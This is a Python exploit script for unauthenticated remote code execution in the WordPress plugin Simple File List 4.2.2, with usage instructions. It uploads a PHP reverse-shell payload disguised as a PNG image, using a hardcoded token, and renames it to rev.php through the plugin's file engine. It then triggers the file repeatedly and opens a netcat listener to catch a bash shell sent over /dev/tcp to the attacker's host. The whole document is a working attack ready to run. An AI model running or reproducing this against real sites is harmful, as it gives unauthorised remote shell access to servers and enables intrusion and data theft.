#!/usr/bin/env python3
# Title: Unauthenticated Remote Code Execution in Simple File List 4.2.2
# Author: Jessi
# Usage: python3 sfl_rev.py <target_url> <lhost> <lport>


import requests
import os
import sys
import threading


# Warn if args = 0
if len(sys.argv) <= 1:
    print("Usage: python3 sfl_rev.py <target_url> <lhost> <lport> (ex: python3 sfl_rev.py http://example.com 10.10.10.10 443)")
    exit(1)


# Set target, lhost, and lport
target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]


# Paths
dir_path = '/wp-content/uploads/simple-file-list/'
upload_path = '/wp-content/plugins/simple-file-list/ee-upload-engine.php'
move_path = '/wp-content/plugins/simple-file-list/ee-file-engine.php'
payload = f'''<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");'''


# Write payload file
print("[!] Writing payload...")
with open ('rev.png', 'wb') as f:
    f.write(payload.encode())


# Stage 1 - upload 
print("[!] Sending stage 1...")
files = {'file': ('rev.png', open('rev.png', 'rb'), 'image/png')}
datas = {'eeSFL_ID': 1, 'eeSFL_FileUploadDir': dir_path, 'eeSFL_Timestamp': 1587258885, 'eeSFL_Token': 'ba288252629a5399759b6fde1e205bc2'}
r = requests.post(url=f'{target}{upload_path}', data=datas, files=files, verify=False)


# Stage 2 - move
print("[!] Sending stage 2...")
headers = {'Referer': f'{target}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1', 'X-Requested-With': 'XMLHttpRequest'}
datas2 = {'eeSFL_ID': 1, 'eeFileOld': 'rev.png', 'eeListFolder': '/', 'eeFileAction': 'Rename|rev.php'}
r2 = requests.post(url=f'{target}{move_path}', data=datas2, headers=headers, verify=False)


# Stage 3 - shell
print("[!] Sending stage 3...")
def spawner():
    while True:
        requests.get(url=f'{target}{dir_path}rev.php')
threading.Thread(target=spawner).start()


# Listner
print("[+] Spawning shell")
os.system(f'nc -lvnp {lport}')
